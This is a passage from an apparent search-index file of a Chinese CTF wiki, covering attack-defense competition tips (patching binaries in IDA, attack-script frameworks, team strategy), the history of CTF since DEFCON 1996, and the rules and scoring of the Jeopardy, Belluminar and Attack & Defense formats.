<p>\u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002</p>"},{"location":"introduction/experience/#patch","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1","text":"<ol> <li>\u7a0b\u5e8f patch \u8981\u5408\u7406\u5e76\u540c\u65f6\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u5e76\u672a\u516c\u5f00\u662f check \u54ea\u91cc\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002</li> <li>\u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684     patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002</li> <li>\u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002</li> <li>\u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002</li> </ol>"},{"location":"introduction/experience/#_3","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb","text":"<p>\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002</p>"},{"location":"introduction/experience/#_4","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565","text":"<ol> <li>\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002</li> <li>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002</li> <li>\u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002</li> <li>\u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002</li> <li>\u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002</li> </ol>"},{"location":"introduction/history/","title":"CTF \u5386\u53f2","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cThe Past, Present and Future of CTF\u300d\u3002</p>"},{"location":"introduction/history/#ctf_1","title":"CTF \u7684\u8d77\u6e90","text":"<p>CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7684\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002</p>"},{"location":"introduction/history/#ctf_2","title":"\u65e9\u671f CTF \u7ade\u8d5b","text":"<p>\u7b2c\u4e00\u4e2a CTF \u6bd4\u8d5b\uff081996 \u5e74-2001\u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u884c\u51c6\u5907\u4e0e\u9632\u5b88\u6bd4\u8d5b\u76ee\u6807\uff0c\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u624b\u5de5\u8ba1\u5206\u7684\u8bf7\u6c42\u3002</p> <p>\u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002</p>"},{"location":"introduction/history/#ctf_3","title":"\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b","text":"<p>\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002</p> <p>\u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a</p> <ul> <li>\u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u7684\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u88ab\u5ffd\u7565\u3002</li> <li>\u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002</li> <li>\u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002</li> <li>\u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u9a8c\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u884c\u7ef4\u62a4\u4ee5\u53ca\u5b89\u5168\u65b9\u9762\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002</li> </ul>"},{"location":"introduction/mode/","title":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"introduction/mode/#-jeopardy","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy","text":"<p>\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u7c7b\u4f3c\u4e8e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u6797\u5339\u514b\u8d5b\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u8fdb\u884c\u6392\u540d\u3002</p> <p>\u4e0d\u540c\u7684\u662f\u8fd9\u4e2a\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002</p> <p>\u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002</p> <p>\u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002</p>"},{"location":"introduction/mode/#-belluminar","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar","text":"<p>\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u4e2d\u56fd\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002</p> <p>\u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/</p>"},{"location":"introduction/mode/#_1","title":"\u8d5b\u5236\u4ecb\u7ecd","text":"<p>Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF &amp; seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack.</p> <p>\u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u5206\u4eab\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\uff0c\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002</p>"},{"location":"introduction/mode/#_2","title":"\u51fa\u9898\u9636\u6bb5","text":"<p>\u6bcf\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u51fa\u4e24\u4e2aChallenge\u5230challenge\u9898\u5e93</p> <p>\u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa 2 \u9053Challange\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907Challenge\u3002\u51faChallenge\u7684\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002</p> <p>Challenge 1: must be on the Linux platform;</p> <p>Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)</p> <p>\u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053Challenge\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2aChallenge\u5219\u4e3a\u975e Linux \u5e73\u53f0\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002</p> <p>\u4e3a\u4f7f\u6bd4\u8d5bChallenge\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51faChallenge\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684Challenge\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002</p>"},{"location":"introduction/mode/#_3","title":"\u63d0\u4ea4\u90e8\u7f72","text":"<p>\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u6587\u6863\u4e2d\u8981\u6c42\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u4ee3\u7801\u3002</p> <p>\u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5982\u679c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u4ee5\u89e3\u51b3\u95ee\u9898\u3002\u6700\u7ec8\u653e\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002</p>"},{"location":"introduction/mode/#_4","title":"\u89e3\u9898\u7ade\u6280","text":"<p>\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002</p>"},{"location":"introduction/mode/#_5","title":"\u5206\u4eab\u8ba8\u8bba","text":"<p>\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u5206\u4eab\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u591a\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002</p>"},{"location":"introduction/mode/#_6","title":"\u8ba1\u5206\u89c4\u5219","text":"<p>\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u5ea6\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u7684\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1a Score = MaxScore -- | N -- Expect\uff3fN | \u3002N\u4ee3\u8868\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002</p> <p>\u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002</p> <p>\u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\u5f97\u51fa\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u4f1a\u8ba1\u7b97\u5e73\u5747\u503c\u3002</p>"},{"location":"introduction/mode/#_7","title":"\u8d5b\u5236\u603b\u8bc4","text":"<p>\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u63d0\u9ad8\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u53ef\u4ee5\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002</p>"},{"location":"introduction/mode/#-attack-defense","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense","text":""},{"location":"introduction/mode/#_8","title":"\u6982\u8ff0","text":"<p>\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag 